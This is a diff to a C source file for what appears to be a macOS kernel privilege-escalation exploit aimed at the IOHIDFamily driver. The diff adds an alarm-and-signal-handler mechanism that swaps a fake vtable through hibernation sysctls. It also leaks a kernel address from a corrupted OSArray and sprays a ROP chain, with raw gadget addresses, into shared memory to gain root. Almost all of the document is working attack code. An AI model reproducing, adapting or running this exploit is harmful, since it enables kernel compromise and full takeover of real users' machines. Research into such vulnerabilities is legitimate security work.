@@ -1,5 +1,7 @@
 #include <errno.h>              // errno
 #include <fcntl.h>              // open
+#include <pthread.h>            // pthread_*
+#include <setjmp.h>             // setjmp, longjmp
 #include <signal.h>             // SIG*, signal
 #include <stdio.h>              // printf
 #include <stdlib.h>             // atoi
@@ -7,6 +9,7 @@
 #include <unistd.h>             // usleep, getuid, setuid, write, close
 #include <sys/stat.h>           // chmod
 #include <sys/sysctl.h>         // sysctlbyname
+#include <unistd.h>             // ualarm, sleep
 
 #include <mach/mach.h>
 #include <mach-o/loader.h>
@@ -32,6 +35,7 @@ extern const unsigned int helper_len;
 #define PWNAGE_PATH "/System/pwned"
 
 const uint64_t SET_CURSOR_ENABLED_METHOD_INDEX = 2;
+const useconds_t EXPLOIT_TIMEOUT = 1000000; // 1s
 
 #ifdef IOHIDEOUS_READ /* false */
 const uint64_t REGISTER_DISPLAY_METHOD_INDEX = 7;
@@ -87,15 +91,30 @@ static kern_return_t setCursorEnabled(io_connect_t client, bool enable)
 
 typedef struct
 {
+    rop_t *rop;
+    const char **hib_names;
+} timeout_args_t;
+
+typedef struct
+{
     io_connect_t client;
     uint64_t pagesize;
     uint64_t shmem_addr;
     rop_t *rop;
     const char **hib_names;
+    const char *hib_full;
     uint32_t hib_lo;
+#if 0
     uint32_t vtab_lo;
+#else
+    uint32_t rop_hi;
+#endif
 } cb_args_t;
 
+timeout_args_t *global_timeout_args = NULL;
+
+static void* async(void *arg);
+static void timeout(int signo);
 static kern_return_t cb(void *arg);
 
 enum
@@ -108,6 +127,18 @@ enum
 
 int main(int argc, const char **argv)
 {
+    /*
+    mov rsi, r15; call qword ptr [rax + 0x48];
+    mov rsi, r15; call qword ptr [rax + 0x50];
+
+    push rbp; jmp qword ptr [rdi];
+
+    0xffffff80002f5005
+    0xffffff800035f3e6
+    0xffffff80008bd6b6
+    0xffffff8000903050
+    */
+
     if(argc < 2)
     {
         LOG("Usage: %s <steal|kill|logout|wait> [persist]", argv[0]);
@@ -158,6 +189,13 @@ int main(int argc, const char **argv)
     rop_t rop = { 0 };
     if(rop_gadgets(&rop, kernel.buf) != 0)
     {
+        goto out1;
+    }
+
+    // We switch out these addresses through hib, so we need the top 32 bits to be the same
+    if((rop.jmp__vtab1_ >> 32) != (rop.mov_rsi_r15_call__vtab0_ >> 32))
+    {
+        ERR("jmp__vtab1_ and mov_rsi_r15_call__vtab0_ are too far apart, sorry. :(");
         goto out1;
     }
 
@@ -314,7 +352,7 @@ int main(int argc, const char **argv)
     ret = IOConnectCallScalarMethod(client, REGISTER_DISPLAY_METHOD_INDEX, NULL, 0, &screen, &cnt);
     if(ret != KERN_SUCCESS)
     {
-        LOG("Failed to register virtual display: %s", mach_error_string(ret));
+        ERR("Failed to register virtual display: %s", mach_error_string(ret));
         goto out3;
     }
 
@@ -359,7 +397,8 @@ int main(int argc, const char **argv)
 
     uint64_t ptr_addr = rop._hibernateStats + ((uint8_t*)&hib_base[2] - (uint8_t*)&hib) - rop.taggedRelease_vtab_offset;
     uint32_t *ptr_ptr = (uint32_t*)&ptr_addr;
-    uint64_t rop_addr = rop.add__rdi__ecx;
+    //uint64_t rop_addr = rop.add__rdi__ecx;
+    uint64_t rop_addr = rop.jmp__vtab1_;
     uint32_t *rop_ptr = (uint32_t*)&rop_addr;
     hib.graphicsReadyTime    = ptr_ptr[0];
     hib.wakeNotificationTime = ptr_ptr[1];
@@ -393,6 +432,48 @@ int main(int argc, const char **argv)
         }
     }
 
+    // When our rewritten object is used it will spin, so we set an alarm to detect this.
+
+    // First create a separate thread to handle the signal
+    timeout_args_t timeout_args =
+    {
+        .rop = &rop,
+        .hib_names = hib_names,
+    };
+    global_timeout_args = &timeout_args;
+    pthread_t thread;
+    volatile bool thread_continue = true;
+    int r = pthread_create(&thread, NULL, &async, (void*)&thread_continue);
+    if(r != 0)
+    {
+        ERR("pthread_create: %s", strerror(r));
+        return KERN_FAILURE;
+    }
+
+    // Then mask our thread against the alarm
+    sigset_t sigset, oldsigset;
+    r = sigemptyset(&sigset);
+    if(r != 0)
+    {
+        ERR("sigemptyset: %s", strerror(r));
+        goto out3;
+    }
+    r = sigaddset(&sigset, SIGALRM);
+    if(r != 0)
+    {
+        ERR("sigaddset: %s", strerror(r));
+        goto out3;
+    }
+    r = pthread_sigmask(SIG_BLOCK, &sigset, &oldsigset);
+    if(r != 0)
+    {
+        ERR("pthread_sigmask: %s", strerror(r));
+        goto out3;
+    }
+
+    // And set up the timer
+    ualarm(EXPLOIT_TIMEOUT, 0);
+
     LOG("Triggering exploit...");
     cb_args_t args =
     {
@@ -401,10 +482,23 @@ int main(int argc, const char **argv)
         .shmem_addr = shmem_addr,
         .rop = &rop,
         .hib_names = hib_names,
+        .hib_full = "kern.hibernatestatistics",
         .hib_lo = hib_ptr[0],
+#if 0
         .vtab_lo = ptr_ptr[0],
+#else
+        .rop_hi = rop_ptr[1],
+#endif
     };
     ret = heap_spray(master, payload_offset, NULL, 0, &cb, &args);
+
+    // Clean up everything alarm-related... or try to, at least.
+    // If any of those fail then that's too bad for them, at this point we got what we came for.
+    ualarm(0, 0);
+    pthread_sigmask(SIG_SETMASK, &oldsigset, NULL);
+    thread_continue = false;
+    pthread_join(thread, NULL);
+
     if(ret != KERN_SUCCESS)
     {
         goto out3;
@@ -725,23 +819,68 @@ do \
     return retval;
 }
 
+static void* async(void *arg)
+{
+    volatile bool *thread_continue = arg;
+    LOG("Setting up alarm signal handler...");
+    sig_t oldfunc = signal(SIGALRM, &timeout);
+
+    while(*thread_continue)
+    {
+        sleep(1);
+    }
+
+    LOG("Restoring alarm signal handler...");
+    signal(SIGALRM, oldfunc);
+    return NULL;
+}
+
+static void timeout(int signo)
+{
+    // At this point, we have a corrupted object that is spinning in kernel mode
+    printf("\n"); // from percentage counter
+    LOG("Got alarm signal, switching out fake vtab...");
+
+    // First set the value we're not spinning on
+    uint32_t *ptr = (uint32_t*)&global_timeout_args->rop->memcpy_gadget;
+    for(size_t i = 0; i < 2; ++i)
+    {
+        if(sysctlbyname(global_timeout_args->hib_names[i], NULL, NULL, &ptr[i], sizeof(*ptr)) != 0)
+        {
+            ERR("sysctl(\"%s\") failed: %s", global_timeout_args->hib_names[i], strerror(errno));
+            return;
+        }
+    }
+
+    ptr = (uint32_t*)&global_timeout_args->rop->mov_rsi_r15_call__vtab0_;
+    // Now set the low bits of our gadget, we already made sure the high bits need no changing
+    if(sysctlbyname(global_timeout_args->hib_names[2], NULL, NULL, ptr, sizeof(*ptr)) != 0)
+    {
+        ERR("sysctl(\"%s\") failed: %s", global_timeout_args->hib_names[2], strerror(errno));
+        return;
+    }
+}
+
 static kern_return_t cb(void *arg)
 {
     static bool ran = false;
 
+    // Disable alarms while we're working here
+    ualarm(0, 0);
+
     // No point in running if we already did
     if(ran)
     {
+        // Reset timer
+        ualarm(EXPLOIT_TIMEOUT, 0);
         return KERN_SUCCESS;
     }
 
     cb_args_t *args = arg;
-
-    // Trick: shmem can have upper 32 bits 0xffffff91 or 0xffffff92, but
-    // the lower 32 bits are either very high or very low depending on that.
-    // Perfect case for signed int addition. :P
+    uint64_t kernel_addr;
+#if 0
     int32_t val = 0;
-    size_t size = sizeof(uint32_t);
+    size_t size = sizeof(val);
     if(sysctlbyname(args->hib_names[0], &val, &size, NULL, 0) != 0)
     {
         printf("\n");
@@ -752,16 +891,40 @@ static kern_return_t cb(void *arg)
     // No change, no action
     if(val == args->vtab_lo)
     {
+        ualarm(EXPLOIT_TIMEOUT, 0);
         return KERN_SUCCESS;
     }
     // If the value DID change, then we just leaked an address and
     // can now prepare the stage 2 payload.
 
-    // Our calculated address has the chance of being off by one or two pages,
-    // but that's nothing we can't handle ;)
+    // Trick: shmem can have upper 32 bits 0xffffff91 or 0xffffff92, but
+    // the lower 32 bits are either very high or very low depending on that.
+    // Perfect case for signed int addition. :P
     val -= args->vtab_lo + OFFSET_AMOUNT;
-    uint64_t kernel_addr = 0xffffff9200000000ULL + val;
-    printf("\n");
+    kernel_addr = 0xffffff9200000000ULL + val;
+#else
+    hibernate_statistics_t hib;
+    size_t size = sizeof(hib);
+    if(sysctlbyname(args->hib_full, &hib, &size, NULL, 0) != 0)
+    {
+        printf("\n");
+        ERR("sysctl(\"%s\") failed: %s", args->hib_full, strerror(errno));
+        return KERN_FAILURE;
+    }
+
+    // No change, no action
+    if(hib.hidReadyTime == args->rop_hi)
+    {
+        ualarm(EXPLOIT_TIMEOUT, 0);
+        return KERN_SUCCESS;
+    }
+    // If the value DID change, then we just leaked a complete OSArray object,
+    // giving us the buffer address we need for the stage 2 payload.
+
+    memcpy(&kernel_addr, (char*)&hib.graphicsReadyTime + args->rop->OSArray_array_offset, sizeof(kernel_addr));
+    kernel_addr -= OFFSET_AMOUNT;
+#endif
+    printf("\n"); // from the percentage counter
     LOG("Shmem kernel address: 0x%016llx", kernel_addr);
 
     // Get address of shmem into hib
@@ -787,11 +950,14 @@ static kern_return_t cb(void *arg)
         }
     }
 
-    // Put ROP chain at all possible locations
+    // Our calculated address has the chance of being off by one or two pages,
+    // but we just put out ROP chain at all possible locations...
     rop_chain(args->rop, (void*)args->shmem_addr, kernel_addr);
     memcpy((void*)(args->shmem_addr +     args->pagesize), (void*)args->shmem_addr, args->pagesize);
     memcpy((void*)(args->shmem_addr + 2 * args->pagesize), (void*)args->shmem_addr, args->pagesize);
 
     ran = true;
+    // Reset timer
+    ualarm(EXPLOIT_TIMEOUT, 0);
     return KERN_SUCCESS;
 }
